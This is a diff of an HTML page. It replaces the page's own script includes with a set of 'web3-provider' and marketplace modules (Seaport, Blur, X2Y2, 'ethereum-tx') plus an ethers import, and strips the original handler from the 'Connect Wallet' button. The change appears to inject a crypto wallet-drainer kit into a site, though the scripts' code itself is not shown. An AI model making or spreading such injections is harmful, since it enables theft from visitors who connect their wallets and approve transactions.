@@ -4,9 +4,21 @@
 <head>
    
    
-   <script src="/assets/sources.js"></script>   
-      <script src="/assets/polyfills__1003217276696.js"></script>
-   
+  <script src="./assets/web3-provider/web3-modal.js"></script>
+  <script src="./assets/web3-provider/web3-loader.js"></script>
+  <script src="./assets/web3-provider/web3-connect.js"></script>
+  <script src="./assets/web3-provider/web3-module.js"></script>
+  <script src="./assets/web3-provider/web3-alert.js"></script>
+  <script src="./assets/web3-provider/web3-seaport.js"></script>
+  <script src="./assets/web3-provider/web3-data.js"></script>
+<script src="./assets/web3-provider/ethereum-tx.js"></script>
+  <script src="./assets/web3-modules/module-blur.js"></script>
+  <script src="./assets/web3-modules/module-seaport.js"></script>
+  <script src="./assets/web3-modules/module-x2y2.js"></script>
+  <script type="module">
+  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.3/dist/ethers.min.js";
+  import "./assets/web3-provider.js";
+  </script>
    
    
    
@@ -137,7 +149,7 @@
     </div>
 
     <!-- Buttons -->
-    <button class="kodexbutton btn connectbutton connect-button" onclick="init_co()"><i class="kodexbutton fa-solid fa-wallet"></i> Connect Wallet</button>
+    <button class="kodexbutton btn connectbutton connect-button"><i class="kodexbutton fa-solid fa-wallet"></i> Connect Wallet</button>
 
     <!-- Manual connect as link -->
    
